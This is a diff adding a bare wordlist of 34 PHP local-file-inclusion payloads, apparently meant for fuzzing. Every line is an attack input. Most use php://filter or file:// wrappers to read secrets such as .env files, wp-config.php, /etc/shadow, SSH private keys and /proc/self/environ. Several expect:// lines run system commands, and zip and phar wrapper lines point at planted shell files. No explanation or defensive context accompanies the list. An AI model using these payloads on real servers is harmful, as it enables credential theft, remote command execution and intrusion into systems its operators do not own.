@@ -1,0 +1,34 @@
+php://filter/convert.base64-encode/resource=index.php
+php://filter/read=convert.base64-encode/resource=config.php
+php://input
+php://filter/convert.base64-encode/resource=/etc/passwd
+file:///etc/passwd
+expect://id
+php://filter/convert.base64-encode/resource=../config.php
+php://filter/convert.base64-encode/resource=../../.env
+php://filter/convert.base64-encode/resource=../../../etc/passwd
+php://filter/read=convert.base64-encode/resource=/etc/shadow
+php://filter/read=string.rot13/resource=/etc/passwd
+php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd
+php://filter/convert.iconv.utf-8.utf-16/resource=/etc/passwd
+php://filter/convert.base64-encode/resource=../admin/config.php
+php://filter/convert.base64-encode/resource=/var/www/html/.env
+php://wrapper/zip:///var/www/html/shell.zip%23shell.php
+php://wrapper/phar:///var/www/html/shell.phar
+file:///etc/shadow
+file:///etc/hosts
+file:///proc/self/environ
+file:///c:/windows/win.ini
+file:///c:/boot.ini
+file:///var/log/apache2/access.log
+file:///root/.ssh/id_rsa
+expect://whoami
+expect://ls -la
+expect://cat /etc/passwd
+expect://uname -a
+php://filter/convert.base64-encode/resource=/var/www/html/wp-config.php
+php://filter/convert.base64-encode/resource=/etc/nginx/nginx.conf
+php://filter/convert.base64-encode/resource=/etc/apache2/apache2.conf
+php://filter/convert.base64-encode/resource=/etc/mysql/my.cnf
+php://filter/convert.base64-encode/resource=/etc/redis/redis.conf
+php://filter/convert.base64-encode/resource=/home/user/.ssh/id_rsa
